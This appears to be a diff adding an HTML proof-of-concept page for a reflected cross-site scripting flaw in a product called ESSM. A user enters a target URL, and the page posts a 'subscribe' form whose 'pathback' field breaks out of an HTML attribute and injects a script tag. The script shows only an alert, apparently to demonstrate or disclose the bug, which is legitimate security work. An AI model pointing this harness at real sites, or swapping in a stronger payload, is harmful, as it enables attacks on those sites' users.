@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <title>ESSM Reflected XSS attack form</title>
+        <style>#pathback{width:600px;}</style>
+    </head>
+    <body>
+        <label for="essm-url">Copy paste a document URL:</label>
+        <input id="essm-url" name="essm-url">
+        <button id="essm-url-enter" disabled="">OK</button>
+
+        <form id="xss-attack-form" method="post" action="">
+            <h3>XSS Attack form</h3>
+            <p>Target: <span id="current-url"></span></p>
+
+            <label for="action">Action:</label>
+            <input id="action" name="action" value="subscribe" readonly="">
+            <p/>
+            <label for="best">Best:</label>
+            <input id="best" name="best" value="false" readonly="">
+            <p/>
+            <label for="template">Template:</label>
+            <input id="template" name="template" value="1379" readonly="">
+            <p/>
+            <label for="pathback">Pathback:</label>
+            <input id="pathback" name="pathback" value="&quot;&gt;&lt;script&gt;alert(&quot;Code was injected and executed&quot;);&lt;/script&gt;" readonly="">
+            <p/>
+            <input type="submit" value="Submit" id="submit-form" disabled="">
+        </form>
+
+        <script>
+            (function() {
+                document.getElementById("essm-url").onkeyup = function(e) {
+                    if (e.target.value.length) {
+                        document.getElementById("essm-url-enter").disabled = false;
+                    } else {
+                        document.getElementById("essm-url-enter").disabled = true;
+                    }
+                };
+                document.getElementById("essm-url-enter").onclick = function() {
+                    let url = document.getElementById("essm-url").value;
+                    if (url.length) {
+                        url = url + "/subscribe";
+                        document.getElementById("current-url").innerText = url;
+                        document.getElementById("xss-attack-form").action = url;
+                        document.getElementById("submit-form").disabled = false;
+                    }
+                };
+            })();
+        </script>
+    </body>
+</html>
